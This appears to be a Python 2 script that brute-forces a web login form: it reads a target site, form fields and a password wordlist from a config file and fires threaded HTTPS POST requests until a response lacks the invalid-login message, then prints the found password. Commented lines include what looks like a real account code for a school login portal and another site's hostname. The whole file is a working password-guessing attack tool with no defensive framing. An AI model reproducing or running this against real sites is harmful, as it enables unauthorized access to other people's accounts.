import socket 
import httplib
import urllib
import sys
import Connector
import threading
import os
import subprocess
#params = urllib.urlencode({'txtLibWebBidon': '','txtCodeUsager': 'ARSJ02527709','txtMotDePasse': 'T1T2T3$$p','btnConnecter.x': '40','btnConnecter.y': '11','_PostBackInfo': '','_PostBackPar': '','_Fields': 'DQ%2BL%2Bxuv22Yn3B49%2FD4','_NoSeqWeb': '','_InfoSupp': ''})

#print params



nbr=0
invalidmsg=""
retpass=""

def testpass(password):
	 global found
	 global nbr
	 global ivnalidmsg
	 global retpass
	 conn = httplib.HTTPSConnection(site)
	 params1=params.replace('T1T2T3$$p',password)
         #print ("POST",page,params1,headers)
         conn.request("POST",page,params1,headers)
         r1 = conn.getresponse()
         resp = r1.read(15004)
         #print r1.status, r1.reason
         #print resp
         if invalidmsg not  in resp: # and ivnalidmsg2 not in resp:
	         print "[+] password found ! : " + str(password)
                 found = True
		 retpass=password
         else:
                 print '[-] password tested : '+str(password)

	 nbr -=1
		 


headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}

site,page,params,userfield,passfield,user,invalidmsg,passfile,nbrthread=Connector.connect('ConnectorA30.ini')


p = subprocess.Popen(['pwd'], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
out, err = p.communicate()
print out


nbrthread=int(nbrthread)

#params = "username=ousdfdf&password=azerty"
#site='licence.efficientprotection.com'
#page = "/login"
#ivnalidmsg = "/login"
#ivnalidmsg=""
#passfield="password" 
#userfield="username"
#user = "test"
#passfile = "Files/passwords.txt"
#nbrthread=4



found = False
print params
passwd = params.split(passfield+'=')[1].split('&')[0]
userf = params.split(userfield+'=')[1].split('&')[0]

#print passwd
params=params.replace(passwd,'T1T2T3$$p')
params=params.replace(userf,user)
#print params
password = "pass"

conn = httplib.HTTPSConnection(site)
#conn.request("POST","/colnet/login.asp",params,headers)

with open (passfile,'r') as f:
	for line in f:
		password = line.strip() 
		#password = urllib.quote_plus(password)
		t = threading.Thread(target=testpass,args=[password])
		while nbr>=nbrthread:
			pass
		t.start()
		nbr+=1
		if found:
			break	
if found:
	
	print'________   ____  __.'
	print'\_____  \ |    |/ _|'
	print' /   |   \|      <  '
	print'/    |    \    |  \ '
	print'\_______  /____|__ \\'
	print ''
	print "[+] password found ! : " + str(retpass)
 
